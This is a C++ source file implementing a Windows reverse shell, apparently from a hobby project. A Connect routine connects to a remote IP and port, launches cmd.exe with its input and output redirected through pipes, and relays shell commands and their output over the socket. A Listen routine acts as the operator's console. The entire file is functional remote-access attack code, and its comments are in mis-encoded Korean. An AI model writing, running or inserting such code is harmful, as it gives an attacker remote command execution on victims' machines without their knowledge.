#include "ReverseShell.hpp"

namespace mawile {
	void ReverseShell::Listen(int serverPort) {
		std::cout << "WSAStartup is starting...\n";

		/**
		*		@breif WSA�����ϱ�
		*/
		WSADATA wsaData;
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
			throw std::runtime_error("Error: WSAStartup");

		/**
		*		@breif �������� ����
		*/
		svSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (svSocket == INVALID_SOCKET)
			throw std::runtime_error("Error: Invalid svSocket");

		SOCKADDR_IN svAddr_in = { 0 };
		svAddr_in.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
		svAddr_in.sin_family = AF_INET;
		svAddr_in.sin_port = htons(serverPort);

		/**
		*		@breif ���ε�
		*/
		std::cout << "binding...\n";
		if (bind(svSocket, (SOCKADDR*)&svAddr_in, sizeof svAddr_in) == SOCKET_ERROR)
			throw std::runtime_error("Error: bind");

		/**
		*		@breif ������
		*/
		std::cout << "listening...\n";
		if (listen(svSocket, SOMAXCONN) == SOCKET_ERROR)
			throw std::runtime_error("Error: listen");

		/**
		*		@breif Ŭ���̾�Ʈ ����
		*/
		SOCKADDR_IN clAddr_in = { 0 };
		int clsize = sizeof clAddr_in;
		std::cout << "Accepting the client...\n";
		clSocket = accept(svSocket, (SOCKADDR*)&clAddr_in, &clsize);
		if (clSocket == INVALID_SOCKET)
			throw std::runtime_error("Error: Invalid clSocket");

		/**
		*		@breif 1�� ��ٸ���, �ܼ�â û��
		*/
		std::cout << "The client is connected!\n";
		Sleep(1000);
		std::system("cls");

		/**
		*		@breif �񵿱������� Ŭ���̾�Ʈ�κ��� [0x1000] ũ�⸸ŭ ������ �޾ƿ���
		*/
		std::thread thr([&, this]() {
			char buf[BUFSIZE];

			for (;;) {
				RtlZeroMemory(buf, BUFSIZE);
				int recvBytes = recv(clSocket, buf, BUFSIZE, 0);
				if (recvBytes < 0)
					break;

				std::cout << buf;
			}
			});

		char inBuf[BUFSIZE];

		for (;;) {
			RtlZeroMemory(inBuf, BUFSIZE);

			std::size_t count = 0;
			for (;;) {
				int i = getchar();
				if (i == '\n') break;
				inBuf[count++] = i;
			}

			/**
			 *		@breif Ư����ɾ�� ���� ����
			*/
			if (!strcmp(inBuf, "exit")) exit(0);
			if (!strcmp(inBuf, "cmd")) {
				std::cout << "���� ���μ����� ������ �� �����ϴ�.\n";
				continue;
			}
			if (!strcmp(inBuf, "cls")) std::system("cls");
			send(clSocket, inBuf, strlen(inBuf) + 1, 0);
		}

		thr.join();
	}

	void ReverseShell::Connect(const char* serverIp, int serverPort) {
		HANDLE g_hChildStd_IN_Rd = 0;
		HANDLE g_hChildStd_IN_Wr = 0;
		HANDLE g_hChildStd_OUT_Rd = 0;
		HANDLE g_hChildStd_OUT_Wr = 0;

		/**
		 *		@breif WSA�����ϱ�
		*/
		WSADATA wsaData;
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
			throw std::runtime_error("Error: WSAStartup");

		/**
		 *		@breif �������� ����
		*/
		svSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (svSocket == INVALID_SOCKET)
			throw std::runtime_error("Error: Invalid svSocket");

		SOCKADDR_IN svAddr_in = { 0 };
		svAddr_in.sin_family = AF_INET;
		svAddr_in.sin_port = htons(serverPort);
		inet_pton(AF_INET, serverIp, &svAddr_in.sin_addr);

		/**
		 *		@breif ������ ����
		*/
		if (connect(svSocket, (SOCKADDR*)&svAddr_in, sizeof svAddr_in) == SOCKET_ERROR)
			throw std::runtime_error("Error: connect");

		SECURITY_ATTRIBUTES saAttr;
		saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
		saAttr.bInheritHandle = TRUE;
		saAttr.lpSecurityDescriptor = NULL;

		/**
		 *		@breif ������ ���� ���μ����� ����� ����������
		*/
		if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
			throw std::runtime_error("Error: CreatePipe");
		if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
			throw std::runtime_error("Error: SetHandleInformation");

		if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
			throw std::runtime_error("Error: CreatePipe");
		if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
			throw std::runtime_error("Error: SetHandleInformation");

		TCHAR szCmdline[] = TEXT("cmd");
		PROCESS_INFORMATION piProcInfo;
		RtlZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

		STARTUPINFO siStartInfo;
		BOOL bSuccess = FALSE;

		RtlZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
		siStartInfo.cb = sizeof(STARTUPINFO);
		siStartInfo.hStdError = g_hChildStd_OUT_Wr;
		siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
		siStartInfo.hStdInput = g_hChildStd_IN_Rd;
		siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

		/**
		 *		@breif ���� ���μ��� ����
		*/
		bSuccess = CreateProcess(0, szCmdline, 0, 0, TRUE, 0, 0, 0, &siStartInfo, &piProcInfo);

		if (!bSuccess)
			throw std::runtime_error("Error: CreateProcess");
		else
		{
			CloseHandle(piProcInfo.hProcess);
			CloseHandle(piProcInfo.hThread);

			CloseHandle(g_hChildStd_OUT_Wr);
			CloseHandle(g_hChildStd_IN_Rd);
		}


		DWORD dwRead, dwWritten;
		CHAR chBuf[BUFSIZE], inBuf[BUFSIZE];

		/**
		 *		@breif �񵿱������� ���� ���μ����� ����� ���۷� �б�
		*/
		std::thread ([&, this]() {
			for (;;) {
				RtlZeroMemory(chBuf, BUFSIZE);

				bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
				if (!bSuccess || dwRead == 0) break;

				send(svSocket, chBuf, BUFSIZE, 0);
			}
			}).detach();

		for (;;)
		{
			RtlZeroMemory(inBuf, BUFSIZE);
			recv(svSocket, inBuf, BUFSIZE, 0);

			/**
			 *		@breif ���������� ����� Ŭ���̾�Ʈ�� �ڵ����� ��������
			*/
			if (WSAGetLastError()) exit(0);

			/**
			 *		@breif �����÷ο� ����
			*/
			inBuf[BUFSIZE - 1] = '\0';

			/**
			 *		@breif Ư����ɾ�� ���� ����
			*/
			if (!strcmp(inBuf, "exit")) exit(0);
			if (!strcmp(inBuf, "cls")) std::system("cls");

			strcat(inBuf, "\n");
			bSuccess = WriteFile(g_hChildStd_IN_Wr, inBuf, strlen(inBuf), &dwWritten, NULL);
			if (!bSuccess) break;
		}

		CloseHandle(g_hChildStd_IN_Wr);
		CloseHandle(g_hChildStd_OUT_Rd);
	}

	ReverseShell::ReverseShell() {

	}

	ReverseShell::ReverseShell(int serverPort) {
		Listen(serverPort);
	}

	ReverseShell::ReverseShell(const char* serverIp, int serverPort) {
		Connect(serverIp, serverPort);
	}

	ReverseShell::~ReverseShell() {
		closesocket(clSocket);
		closesocket(svSocket);
		WSACleanup();
	}
}